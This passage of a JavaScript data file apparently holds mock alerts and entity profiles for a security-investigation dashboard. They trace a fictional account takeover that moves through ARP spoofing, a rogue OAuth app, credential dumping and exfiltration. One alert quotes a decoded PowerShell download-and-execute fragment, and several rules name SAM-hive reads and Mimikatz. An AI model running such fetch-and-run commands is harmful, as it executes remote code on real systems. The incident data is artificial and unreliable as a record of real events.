/* ═══════════════════════════════════════════════════
 * entities.js — Entity definitions for Investigation Graph
 * Entity Types: alert, user, device, ip, service, process
 * ═══════════════════════════════════════════════════ */

const ENTITIES = {
  'alert-impossible-travel': {
    type: 'alert', modalTitle: 'Alert Details · Impossible Travel',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Impossible Travel',
          'Alert ID':'ALT-2026-04-03-00847',
          'Alert Source':'UEBA Engine',
          'Severity':'Critical',
          'Confidence':'92%',
          'Rule':'Geo-anomaly: login from 2 countries within 12 min',
          'MITRE ATT&CK':'Valid Accounts: Cloud (T1078.004)',
          'First Seen':'2025-06-04 14:32 UTC',
          'Status':'Open — Under Investigation',
          'Assigned To':'Unassigned',
          'Incident ID':'INC-2026-00142 (auto-created)',
          'Correlation':'3 related alerts linked'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: true,
        kv: {
          'Login 1':'10.18.1.81 — New York, USA — 14:20 UTC',
          'Login 2':'185.220.101.42 — Bucharest, Romania — 14:32 UTC',
          'Time Delta':'12 minutes',
          'Distance':'4,500 miles / 7,200 km',
          'Required Speed':'~22,500 mph (physically impossible)',
          'MFA Status':'Login 2 bypassed MFA via token replay',
          'User Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) — matches corporate agent',
          'Risk Score':'94 / 100'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: true,
        kv: {
          'User':'m.henderson (IT Support — Marketing Floor)',
          'Device':'CORP-WS-045 (Windows 11 Pro)',
          'Cloud Services':'Azure AD, SharePoint Online, Exchange Online',
          'External IP':'185.220.101.42 — Bucharest, Romania (Tor Exit Node)',
          'Internal IP':'10.18.1.81 — NYC Office',
          'OAuth Tokens':'2 active (1 suspicious scope)',
          'Processes':'powershell.exe, WinUpdateSvc (both suspicious)'
        }
      },
      correlatedAlerts: {
        label: 'Correlated Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:38:22', dot:'red', malicious: true,
            details: { 'Alert':'LAN ARP Spoofing — MITM', 'Source':'CORP-WS-045', 'Severity':'Critical', 'MITRE':'ARP Cache Poisoning (T1557.002)' } },
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            details: { 'Alert':'Suspicious Service Installed', 'Source':'CORP-WS-045', 'Severity':'High', 'MITRE':'Create/Modify System Process (T1543.003)' } },
          { time:'03 Apr 2026  15:37:01', dot:'red', malicious: true,
            details: { 'Alert':'Encoded PowerShell Execution', 'Source':'CORP-WS-045', 'Severity':'Critical', 'MITRE':'PowerShell (T1059.001)' } }
        ]
      },
      responseActions: {
        label: 'Recommended Response Actions', expanded: false,
        kv: {
          '1. Immediate':'Revoke all OAuth tokens for m.henderson',
          '2. Immediate':'Force password reset + MFA re-registration',
          '3. Contain':'Isolate CORP-WS-045 from network',
          '4. Investigate':'Review SharePoint audit logs for exfiltrated files',
          '5. Remediate':'Remove FileSync Pro app consent',
          '6. Hunt':'Search for 185.220.101.42 across all tenant sign-ins'
        }
      }
    }
  },
  'alert-arp-spoofing-1': {
    type: 'alert', modalTitle: 'Alert Details · LAN ARP Spoofing (14:43)',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'LAN ARP Spoofing — MITM Attack',
          'Alert ID':'ALT-2026-04-03-00849',
          'Alert Source':'Correlation Engine',
          'Triggered At':'03 Apr 2026  14:43:10',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
          'Source Device':'CORP-WS-045',
          'Target':'Network Segment 10.18.1.0/24',
          'Detection Logic':'ARP reply storm from single MAC (>50 gratuitous ARP in 30s)',
          'Affected Users':'m.henderson, j.williams, s.chen (same subnet)',
          'Confidence':'96%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'COR-ARP-001 — ARP Spoofing / MITM',
          'Threshold':'> 20 gratuitous ARP replies within 60 seconds',
          'Actual':'54 gratuitous ARP replies in 28 seconds',
          'Source MAC':'00:1A:2B:3C:4D:5E (CORP-WS-045)',
          'Spoofed IP':'10.18.1.1 (Gateway)'
        }
      }
    }
  },
  'alert-arp-spoofing-2': {
    type: 'alert', modalTitle: 'Alert Details · LAN ARP Spoofing (14:41)',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'LAN ARP Spoofing — MITM Attack',
          'Alert ID':'ALT-2026-04-03-00848',
          'Alert Source':'Correlation Engine',
          'Triggered At':'03 Apr 2026  14:41:10',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
          'Source Device':'CORP-WS-045',
          'Target':'Network Segment 10.18.1.0/24',
          'Detection Logic':'ARP reply storm from single MAC (>50 gratuitous ARP in 30s)',
          'Affected Users':'m.henderson (primary), j.williams',
          'Confidence':'94%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'COR-ARP-001 — ARP Spoofing / MITM',
          'Threshold':'> 20 gratuitous ARP replies within 60 seconds',
          'Actual':'48 gratuitous ARP replies in 32 seconds',
          'Source MAC':'00:1A:2B:3C:4D:5E (CORP-WS-045)',
          'Spoofed IP':'10.18.1.1 (Gateway)'
        }
      }
    }
  },
  'alert-oauth-token': {
    type: 'alert', modalTitle: 'Alert Details · Suspicious OAuth Token',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Suspicious OAuth Token — Broad Scope',
          'Alert ID':'ALT-2026-04-03-00850',
          'Alert Source':'Cloud Security Engine',
          'Triggered At':'03 Apr 2026  14:33:15',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1550.001 (Application Access Token)',
          'User':'m.henderson',
          'App':'FileSync Pro (unverified publisher)',
          'Scope':'Mail.ReadWrite, Files.ReadWrite.All, User.Read',
          'Source IP':'185.220.101.42 (Tor)',
          'Confidence':'89%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'CLD-OAUTH-002 — Broad Scope from Untrusted App',
          'Condition':'Unregistered app + Files.ReadWrite.All + risky IP',
          'User Self-Consented':'Yes ⚠',
          'Admin Consent':'No',
          'Publisher Verified':'No ✗'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'App':'FileSync Pro', 'Service':'Azure AD Portal', 'Token Type':'OAuth 2.0 Bearer', 'Process':'proc-oauth' }
      }
    }
  },
  'alert-app-consent': {
    type: 'alert', modalTitle: 'Alert Details · New App Consent',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'New App Consent — FileSync Pro',
          'Alert ID':'ALT-2026-04-03-00851',
          'Alert Source':'App Governance',
          'Triggered At':'03 Apr 2026  14:35:00',
          'Severity':'Medium',
          'Status':'Open',
          'MITRE ATT&CK':'T1098.003 (Additional Cloud Roles)',
          'User':'m.henderson',
          'App':'FileSync Pro',
          'Permissions':'Mail.ReadWrite, Files.ReadWrite.All',
          'Confidence':'78%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'GOV-APP-001 — User consent to unregistered app',
          'Condition':'App not in approved catalog + broad permissions',
          'Publisher':'Unverified',
          'First Seen':'03 Apr 2026 (same day as compromise)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'Azure AD Portal', 'App':'FileSync Pro' }
      }
    }
  },
  'alert-enc-powershell': {
    type: 'alert', modalTitle: 'Alert Details · Encoded PowerShell Execution',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Encoded PowerShell Execution',
          'Alert ID':'ALT-2026-04-03-00852',
          'Alert Source':'EDR Engine',
          'Triggered At':'03 Apr 2026  15:36:22',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1059.001 (PowerShell)',
          'Device':'CORP-WS-045',
          'User':'m.henderson',
          'Process':'powershell.exe (PID: 4892)',
          'Command':'-nop -w hidden -encodedcommand ...',
          'Confidence':'97%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-PS-003 — Encoded + Hidden Window',
          'Flags':'-NoProfile, -WindowStyle Hidden, -EncodedCommand',
          'Decoded Content':'IEX (New-Object Net.WebClient).DownloadString(...)',
          'AMSI Result':'AMSI_RESULT_DETECTED (3 events)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe (PID 4892)', 'Parent Process':'powershell.exe (PID 3104)' }
      }
    }
  },
  'alert-sam-access': {
    type: 'alert', modalTitle: 'Alert Details · SAM Database Access',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'SAM Database Access Attempt',
          'Alert ID':'ALT-2026-04-03-00853',
          'Alert Source':'EDR Engine',
          'Triggered At':'03 Apr 2026  15:36:28',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1003 (OS Credential Dumping)',
          'Device':'CORP-WS-045',
          'User':'m.henderson',
          'Process':'powershell.exe (PID: 4892)',
          'Target':'C:\\Windows\\System32\\config\\SAM',
          'Confidence':'94%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-CRED-001 — SAM File Read',
          'Condition':'Non-SYSTEM process reading SAM hive',
          'Process Integrity':'Medium (not elevated)',
          'Mimikatz Indicators':'Invoke-Mimikatz detected via AMSI'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe (PID 4892)', 'Credential Store':'SAM Database' }
      }
    }
  },
  'alert-c2-conn': {
    type: 'alert', modalTitle: 'Alert Details · Outbound C2 Connection',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Outbound Connection to Known C2',
          'Alert ID':'ALT-2026-04-03-00854',
          'Alert Source':'NDR Engine',
          'Triggered At':'03 Apr 2026  15:37:01',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
          'Device':'CORP-WS-045',
          'Destination':'185.220.101.42:443 (Tor Exit Node)',
          'Process':'powershell.exe (PID: 4892)',
          'Protocol':'HTTPS',
          'Confidence':'96%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'NDR-C2-001 — Known C2 Infrastructure',
          'Threat Feed Match':'AbuseIPDB (98%), VirusTotal (12/89)',
          'Beacon Pattern':'60s interval, consistent payload size',
          'Domain':'c2-relay.onion.ws'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe', 'Destination IP':'185.220.101.42', 'Service':'WinUpdateSvc (beacon)' }
      }
    }
  },
  'alert-sus-service': {
    type: 'alert', modalTitle: 'Alert Details · Suspicious Service Installed',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Suspicious Service Installed — WinUpdateSvc',
          'Alert ID':'ALT-2026-04-03-00855',
          'Alert Source':'EDR Engine',
          'Triggered At':'03 Apr 2026  15:36:22',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1543.003 (Create/Modify System Process)',
          'Device':'CORP-WS-045',
          'Service':'WinUpdateSvc',
          'Binary':'C:\\Windows\\Temp\\wuhelper.exe',
          'Signed':'No ⚠',
          'Confidence':'91%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-SVC-002 — Unsigned Service from Temp Path',
          'Condition':'New service + unsigned binary + temp directory',
          'Name Similarity':'wuauserv (Windows Update) — masquerading',
          'Created By':'powershell.exe via sc.exe create'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Process':'powershell.exe (installer)', 'User':'m.henderson' }
      }
    }
  },
  'alert-tor-conn': {
    type: 'alert', modalTitle: 'Alert Details · Outbound Tor Connection',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Outbound Connection to Tor Exit Node',
          'Alert ID':'ALT-2026-04-03-00856',
          'Alert Source':'NDR Engine',
          'Triggered At':'03 Apr 2026  15:36:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
          'Device':'CORP-WS-045',
          'Destination':'185.220.101.42:443',
          'Service':'WinUpdateSvc (wuhelper.exe)',
          'Confidence':'98%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'NDR-TOR-001 — Tor Exit Node Communication',
          'Condition':'Outbound HTTPS to known Tor exit',
          'Service':'WinUpdateSvc (masquerading)',
          'Interval':'60s beacon pattern'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Destination IP':'185.220.101.42' }
      }
    }
  },
  'alert-data-exfil': {
    type: 'alert', modalTitle: 'Alert Details · Potential Data Exfiltration',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Potential Data Exfiltration via C2 Channel',
          'Alert ID':'ALT-2026-04-03-00857',
          'Alert Source':'DLP + NDR Correlation',
          'Triggered At':'03 Apr 2026  15:38:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1041 (Exfiltration Over C2 Channel)',
          'Device':'CORP-WS-045',
          'Data Volume':'248 MB via HTTP',
          'Destination':'91.215.85.12:8080',
          'Confidence':'93%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-EXFIL-003 — Large Outbound Transfer to Untrusted Host',
          'Threshold':'>100 MB to unknown destination',
          'Actual':'248 MB in single session',
          'Protocol':'HTTP (unencrypted) ⚠',
          'Source Process':'wuhelper.exe (WinUpdateSvc)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Destination':'91.215.85.12:8080', 'Data Source':'SharePoint files staged locally' }
      }
    }
  },
  'alert-bulk-download': {
    type: 'alert', modalTitle: 'Alert Details · Bulk File Download',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Bulk File Download Detected',
          'Alert ID':'ALT-2026-04-03-00858',
          'Alert Source':'DLP Engine',
          'Triggered At':'03 Apr 2026  15:34:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1530 (Data from Cloud Storage)',
          'User':'m.henderson',
          'Service':'SharePoint Online',
          'Files':'142 files in 4 minutes',
          'Data Volume':'2.3 GB',
          'Confidence':'95%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-SP-001 — Mass File Download',
          'Threshold':'>50 files in 10 minutes',
          'Actual':'142 files in 4 minutes',
          'Baseline':'8 files/day (peer average)',
          'Deviation':'17.75× above normal'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'SharePoint Online', 'Sites':'Finance-Reports, HR-Confidential, Project-Atlas' }
      }
    }
  },
  'alert-sensitive-access': {
    type: 'alert', modalTitle: 'Alert Details · Sensitive File Access',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Confidential File Accessed',
          'Alert ID':'ALT-2026-04-03-00859',
          'Alert Source':'DLP Engine',
          'Triggered At':'03 Apr 2026  15:35:00',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1213.002 (Data from Information Repositories: SharePoint)',
          'User':'m.henderson',
          'Service':'SharePoint Online',
          'Files':'Q4-Revenue-Projections.xlsx, Employee-Compensation-2026.xlsx',
          'Labels':'Confidential — Finance, Highly Confidential — HR',
          'Confidence':'88%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-LABEL-002 — Access to Confidential-Labeled Files',
          'Condition':'Bulk access to files with Confidential sensitivity label',
          'Files Affected':'8 with sensitivity labels',
          'Classification':'PII + Financial data'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'SharePoint Online', 'Sites':'Finance-Reports, HR-Confidential' }
      }
    }
  },
  'alert-admin-offhours': {
    type: 'alert', modalTitle: 'Alert Details · Admin Off-Hours Login',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Admin Login Outside Business Hours',
          'Alert ID':'ALT-2026-04-01-00840',
          'Alert Source':'UEBA Engine',
          'Triggered At':'01 Apr 2026  22:15:00',
          'Severity':'Medium',
          'Status':'Resolved',
          'MITRE ATT&CK':'T1078 (Valid Accounts)',
          'User':'admin (Global Administrator)',
          'Device':'DC-01',
          'Source IP':'10.0.0.5',
          'Confidence':'62%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'UEBA-ADMIN-001 — Privileged Login Off-Hours',
          'Business Hours':'08:00 — 18:00 (Mon-Fri)',
          'Login Time':'22:15 (outside business hours)',
          'MFA':'Hardware token ✓',
          'Note':'Resolved — admin confirmed emergency maintenance'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'admin (Global Administrator)', 'Device':'DC-01', 'Source':'10.0.0.5' }
      }
    }
  },
  'user-m-henderson': {
    type: 'user', modalTitle: 'User Activity · m.henderson',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 94,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Compromised Account',
          metrics: [
            { icon:'⚠', label:'Active Anomalies', value:'7', color:'#dc2626' },
            { icon:'🔐', label:'Failed Logins (24h)', value:'4', color:'#ea580c' },
            { icon:'🌍', label:'Impossible Travel', value:'Detected', color:'#dc2626' },
            { icon:'📁', label:'DLP Violations', value:'2', color:'#d97706' },
            { icon:'🛡', label:'Attack Paths', value:'5', color:'#dc2626' },
            { icon:'⏱', label:'Time Since First Alert', value:'1h 14m', color:'#7c3aed' }
          ],
          firstSeen: '03 Apr 2026 14:22:45',
          lastActivity: '03 Apr 2026 15:36:22',
          investigationStatus: 'Active — Auto-escalated to Tier 2'
        }
      },
      usersDetails: {
        label: 'User Details', expanded: true,
        kv: { 'Display Name':'m.henderson', 'SAM Account Name':'m.henderson', 'UPN':'m.henderson@contoso.com', 'Email':'m.henderson@corp.local', 'Job Title':'IT Support Engineer', 'Department':'IT', 'Manager':'j.williams (IT Manager)', 'Last Logon Time':'14:41:10', 'OU Name':'OU 1', 'Account Created':'2024-03-15', 'Account Status':'Active ⚠ (Recommended: Disable)', 'Logon Workstation':'CORP-WS-045', 'Primary Group':'Domain Users' }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', details: { 'Logon Type':'Interactive (logon via keyboard/system)', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'03 Apr 2026  15:30:01', dot:'green', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.18.1.81', 'Status':'Success to DC' } },
          { time:'03 Apr 2026  15:28:05', dot:'orange', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.112.11.1', 'Status':'Failure' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  15:36:22', dot:'red', details: { 'Logon Type':'Interactive (logon via keyboard/system)', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'03 Apr 2026  15:30:01', dot:'green', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.18.1.81', 'Status':'Success to DC' } },
          { time:'03 Apr 2026  15:28:05', dot:'orange', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.112.11.1', 'Status':'Failure' } },
          { time:'03 Apr 2026  14:58:12', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'CORP-FS-02', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'03 Apr 2026  14:22:45', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'03 Apr 2026  09:15:33', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'02 Apr 2026  17:45:00', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'CORP-DC-01', 'Source IP':'10.18.1.81', 'Status':'Success' } }
        ]
      },
      processes: {
        label: 'Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'proc-powershell', label:'Powershell.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'powershell.exe', 'Parent process':'powershell.exe' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'proc-powershell', label:'Powershell.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'powershell.exe', 'Parent process':'powershell.exe' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } },
          { time:'03 Apr 2026  15:35:10', dot:'orange', viewOnGraph: { nodeId:'proc-cmd', label:'cmd.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'cmd.exe', 'Parent process':'explorer.exe' } },
          { time:'03 Apr 2026  14:20:00', dot:'green', viewOnGraph: { nodeId:'proc-outlook', label:'outlook.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'outlook.exe', 'Parent process':'explorer.exe' } }
        ]
      },
      serviceTriggered: {
        label: 'Service Triggered', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' },
            action: { label:'⊘ Stop Services', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'03 Apr 2026  14:30:01', dot:'orange', viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'wuauserv', 'Display name':'Windows Update', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Paused', 'Severity':'High' } },
          { time:'03 Apr 2026  14:42:03', dot:'green', viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' } }
        ],
        viewAllData: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' },
            action: { label:'⊘ Stop Services', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'03 Apr 2026  14:30:01', dot:'orange', viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'wuauserv', 'Display name':'Windows Update', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Paused', 'Severity':'High' } },
          { time:'03 Apr 2026  14:42:03', dot:'green', viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' } },
          { time:'03 Apr 2026  10:15:22', dot:'green', viewOnGraph: { nodeId:'svc-spooler', label:'Spooler', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'Spooler', 'Display name':'Print Spooler', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Running', 'Severity':'Normal' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  14:38:22', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-1', label:'ARP Spoofing Alert', icon:'🔔', sourceEntity:'user-m-henderson' },
            alertProfileId: 'alert-arp-spoofing-1',
            detailsGrid: [
              { label:'14:43:10 LAN ARP Spoofing', value:'MiTM Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  14:39:01', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-2', label:'ARP Spoofing Alert', icon:'🔔', sourceEntity:'user-m-henderson' },
            alertProfileId: 'alert-arp-spoofing-2',
            detailsGrid: [
              { label:'14:41:10 LAN ARP Spoofing', value:'MiTM Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      resourceFileAccess: {
        label: 'Resource and file access', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:34:18', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'Q4_Revenue_Forecast.xlsx', 'Location':'SharePoint:/Finance/Sensitive', 'Change Type':'Downloaded', 'Size':'2.4 MB', 'Classification':'Confidential' } },
          { time:'03 Apr 2026  15:33:45', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'Employee_Salary_Data.csv', 'Location':'SharePoint:/HR/Restricted', 'Change Type':'Downloaded', 'Size':'890 KB', 'Classification':'Highly Confidential' } },
          { time:'03 Apr 2026  15:32:10', dot:'orange',
            details: { 'Host':'CORP-WS-045', 'File Name':'Board_Meeting_Notes.docx', 'Location':'SharePoint:/Executive/Private', 'Change Type':'Downloaded', 'Size':'1.1 MB', 'Classification':'Internal Only' } },
          { time:'03 Apr 2026  15:30:55', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'vendor_contracts_2026.pdf', 'Location':'SharePoint:/Legal/Contracts', 'Change Type':'Copied to USB', 'Size':'4.7 MB', 'Classification':'Confidential' } },
          { time:'03 Apr 2026  15:28:02', dot:'orange',
            details: { 'Host':'CORP-WS-045', 'File Name':'network_topology.vsdx', 'Location':'c:\\IT\\Diagrams', 'Change Type':'Accessed', 'Size':'3.2 MB', 'Classification':'Internal Only' } },
          { time:'03 Apr 2026  14:38:22', dot:'green',
            details: { 'Host':'CORP-WS-045', 'File Name':'financial_records.txt', 'Location':'c:\\restricted share\\secret', 'Change Type':'Created', 'Size':'128 KB', 'Classification':'Standard' } }
        ]
      },
      uebaProfile: {
        label: 'UEBA Risk Profile', expanded: false,
        kv: {
          'Risk Score':'94 / 100 — Critical',
          'Peer Group':'IT Support Engineers (avg: 22)',
          'Deviation':'4.3× above peer average',
          'Risk Trend':'↑ +67 in last 24h (was 27)',
          'Anomalies Detected':'7 in last 24h',
          'Baseline Logon Hours':'08:00 – 18:00 EST',
          'Actual Logon':'14:32 UTC (Bucharest) — Outside baseline',
          'Data Exfil Score':'High — 142 files in 4 min (peer avg: 8/day)',
          'Account Type':'Standard User (No admin privileges)',
          'Watch List':'Added automatically — Score > 90'
        }
      },
      loginStatistics: {
        label: 'Login Statistics (7 days)', expanded: false,
        kv: {
          'Total Logins':'47',
          'Successful':'43 (91.5%)',
          'Failed':'4 (8.5%)',
          'Unique Source IPs':'3',
          'Unique Geolocations':'2 (New York, Bucharest ⚠)',
          'MFA Challenges':'12',
          'MFA Bypassed':'1 ⚠ (Token replay from Bucharest)',
          'Off-Hours Logins':'2',
          'Avg Session Duration':'6h 22m',
          'Concurrent Sessions':'2 ⚠ (NY + Bucharest simultaneous)'
        }
      },
      cloudIdentities: {
        label: 'Cloud Identities & Assets', expanded: false,
        kv: {
          'Azure AD':'m.henderson@contoso.com — Entra ID P2',
          'Azure Roles':'User (no privileged roles)',
          'Conditional Access':'3 policies applied',
          'Registered Devices':'2 (CORP-WS-045, iPhone 15)',
